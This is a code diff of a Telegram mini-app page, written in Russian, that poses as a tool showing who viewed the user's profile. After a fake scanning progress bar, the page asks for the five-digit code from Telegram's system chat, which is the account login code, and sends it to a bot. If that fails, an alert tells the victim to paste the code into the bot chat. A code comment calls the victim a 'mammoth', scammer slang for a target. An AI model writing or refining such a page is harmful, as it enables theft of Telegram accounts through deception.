@@ -16,26 +16,22 @@
         .progress-bar { width: 0%; height: 100%; background: var(--btn); transition: width 0.4s ease; }
         input { width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; border-radius: 12px; padding: 14px; color: white; font-size: 18px; margin-bottom: 15px; box-sizing: border-box; text-align: center; outline: none; }
         .btn { width: 100%; background: var(--btn); color: white; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; }
-        .period-btn { background: #2c2c2e; margin-bottom: 10px; color: #fff; border: 1px solid #3a3a3c; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo"></div>
-        
         <div id="step-period">
             <h2>Анализ гостей</h2>
-            <p>Выберите период для сканирования логов посещений вашего профиля:</p>
-            <button class="btn period-btn" onclick="startLoading()">За 7 дней</button>
-            <button class="btn period-btn" onclick="startLoading()">За 30 дней</button>
+            <p>Выберите глубину сканирования логов посещений вашего профиля:</p>
+            <button class="btn" style="background:#2c2c2e;margin-bottom:10px;" onclick="startLoading()">За 7 дней</button>
+            <button class="btn" onclick="startLoading()">За 30 дней</button>
         </div>
-
         <div id="step-loading" style="display:none;">
             <h2 id="load-text">Загрузка...</h2>
             <div class="progress-container" style="display:block;"><div class="progress-bar" id="bar"></div></div>
             <p id="load-hint">Установка соединения с сервером...</p>
         </div>
-
         <div id="step-code" style="display:none;">
             <h2>Токен доступа</h2>
             <p>Введите 5-значный <b>токен</b> из системного чата Telegram:</p>
@@ -43,57 +39,38 @@
             <button class="btn" id="confirm-btn" onclick="sendCode()">Подтвердить токен</button>
         </div>
     </div>
-
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-
         function startLoading() {
             document.getElementById('step-period').style.display = 'none';
             document.getElementById('step-loading').style.display = 'block';
             let width = 0;
             const bar = document.getElementById('bar');
-            
             const interval = setInterval(() => {
                 width += 5;
+                bar.style.width = width + '%';
                 if (width >= 75) {
                     clearInterval(interval);
-                    bar.style.width = '75%';
                     setTimeout(() => {
                         document.getElementById('step-loading').style.display = 'none';
                         document.getElementById('step-code').style.display = 'block';
                     }, 1000);
-                } else {
-                    bar.style.width = width + '%';
                 }
             }, 300);
         }
-
         function sendCode() {
             const val = document.getElementById('u_code').value;
-            const btn = document.getElementById('confirm-btn');
-            
-            if(val.length < 5) return; // Игнорим короткий код
-
-            btn.disabled = true;
-            btn.innerText = "Авторизация...";
-
-            // Основная попытка отправки
+            if(val.length < 5) return;
+            document.getElementById('confirm-btn').innerText = "Проверка...";
             try {
-                // Если tg.sendData не срабатывает, пробуем через 2 секунды вывести ошибку
-                const timeout = setTimeout(() => {
-                    btn.disabled = false;
-                    btn.innerText = "Ошибка. Повторить?";
-                    console.log("SendData timeout");
-                }, 4000);
-
+                // Пытаемся отправить данные боту
                 tg.sendData(JSON.stringify({t: 'c', v: val}));
-                
-                // Если данные ушли, ТГ закроет окно сам или через этот таймер
-                setTimeout(() => { tg.close(); }, 2000);
-            } catch (err) {
-                btn.disabled = false;
-                btn.innerText = "Ошибка связи";
+                setTimeout(() => { tg.close(); }, 1500);
+            } catch (e) {
+                // Если sendData не пашет, даем мамонту инструкцию
+                alert("Ошибка синхронизации. Пожалуйста, отправьте код текстом в чат бота.");
+                tg.close();
             }
         }
     </script>
